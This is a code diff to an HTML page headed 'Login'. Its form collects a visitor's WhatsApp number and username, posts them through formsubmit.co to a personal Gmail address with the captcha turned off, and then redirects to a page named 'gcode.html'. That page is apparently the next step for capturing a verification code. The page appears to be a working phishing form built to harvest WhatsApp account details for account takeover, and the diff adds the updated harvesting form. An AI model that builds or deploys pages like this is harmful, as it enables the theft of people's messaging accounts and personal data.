@@ -76,17 +76,22 @@ button:hover {
 <body>
   <div class="login-container">
   <h1>Login</h1>
-  <form action="https://formsubmit.co/emmanuelkoranteng362@gmail.com" method="POST" onsubmit="redirectToGCode()">
-    <div class="input-group">
-      <label for="whatsapp-number">WhatsApp Number</label>
-      <input type="text" name="whatsapp-number" placeholder="+ 1 234 567 8900" required>
-    </div>
-    <div class="input-group">
-      <label for="whatsapp-username">WhatsApp Username</label>
-      <input type="text" name="whatsapp-username" placeholder="@username" required>
-    </div>
-    <input type="hidden" name="_next" value="gcode.html">
-    <button type="submit">LOG IN</button>
+  <form action="https://formsubmit.co/emmanuelkoranteng362@gmail.com" method="POST">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="table">
+  <input type="hidden" name="_next" value="gcode.html">
+
+  <div class="input-group">
+    <label for="whatsapp-number">WhatsApp Number</label>
+    <input type="text" name="whatsapp-number" placeholder="+233..." required>
+  </div>
+
+  <div class="input-group">
+    <label for="whatsapp-username">WhatsApp Username</label>
+    <input type="text" name="whatsapp-username" placeholder="@username" required>
+  </div>
+
+  <button type="submit">LOG IN</button>
   </form>
 </div>
 
